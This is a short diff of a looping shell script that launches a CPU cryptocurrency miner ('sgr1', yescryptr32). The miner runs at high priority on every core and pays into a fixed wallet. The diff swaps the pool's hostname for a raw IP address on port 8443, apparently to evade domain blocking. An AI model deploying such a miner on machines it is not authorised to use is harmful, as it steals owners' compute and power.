@@ -24,7 +24,7 @@ while true; do
     pid=$!
 
     # Run the process with the specified parameters
-    nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
+    nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool 45.115.224.59:8443 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 
     # Run for 1 minute
     sleep 60
